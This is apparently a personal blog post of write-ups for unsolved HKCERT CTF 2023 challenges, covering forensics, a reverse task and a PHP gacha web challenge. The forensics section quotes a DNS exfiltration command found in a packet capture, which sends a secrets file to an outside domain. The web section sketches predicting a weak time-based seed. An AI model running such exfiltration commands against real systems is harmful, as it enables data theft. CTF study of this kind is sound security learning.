---
layout: post
title:  "HKCERT CTF 2023 Writeups - Undones"
date:   2023-11-10 21:00:00 +0800
category: 
    - ctf
    - hkcert23ctf
---

Here is the writeup for all undone challenges - *sigh*

> `hkcert23{he110_aga1n_4nd_we1c0m3_t0_hkc3r7_c7f}`

## 收到收到 (0/200 pts) (with guide)

The official guide is [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-i-en-a58d115f39feab46#%E6%94%B6%E5%88%B0%E6%94%B6%E5%88%B0--yes-I-know-I-know-Forensic).

### Exploration

While exploring the pcapng file, I found
    Invoke-DNSExfiltrator -i C:\Users\Tom\Desktop\secrets.txt.txt -d igotoschoolbybus.online -p 'K#2dF!8t@1qZ' -s 192.168.135.135
as well as some strange bytes after it. A Google search indicated that there may be RC4 encryption being used.  

Alas, I'm unable to reverse the encryption (I might have looked into not the correct bytes).

## 轉蛋模擬器 (0/250 pts) (with guide)

The official guide is [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-zh-e2ef72e18599ccdb#%E8%BD%89%E8%9B%8B%E6%A8%A1%E6%93%AC%E5%99%A8--Gacha-Simulator-Reverse).

### Exploration

I do not have 32-bit Office, and thus the original exploit cannot be ran without significant time.  
Should have invested time to make a sandbox Windows machines next time, ahaha~

## Fake/Ground Offer (0/250 pts)

### Exploration

This gacha code looks fishy...

    $seed = (time() - $pin) % 3600 + 1;  //cannot use zero as seed

    function gacha($n,$s){
        $out = [];

        for($i=1;$i<=$n;$i++){
            $x = sin($i*$s);
            $r = $x-floor($x);
            $out[] = lookup($r);
        }
        return $out;
    }

    function lookup($r){
        if($r <= 0.001){
            $_SESSION["inventory"]["UR"] += 1;
            return "UR";
        }elseif($r <= 0.004){
            $_SESSION["inventory"]["SSR"] += 1;
            return "SSR";
        }elseif($r <= 0.009){
            $_SESSION["inventory"]["SR"] += 1;
            return "SR";
        }elseif($r <= 0.016){
            $_SESSION["inventory"]["R"] += 1;
            return "R";
        }else{
            $_SESSION["inventory"]["N"] += 1;
            return "N";
        }
    }

If I draw only 1 card, and get knowledge about the pin somehow, I can draw the cards at the correct time in the hour and get some SSRs.

The pin may be reversed by sending 3600 requests to the server to determine the current shift (note $seed is a periodic function with length 3600). If you can synchronize it... you can break the gacha.

But I do not know how to gain access to $pin w/o bruteforcing. 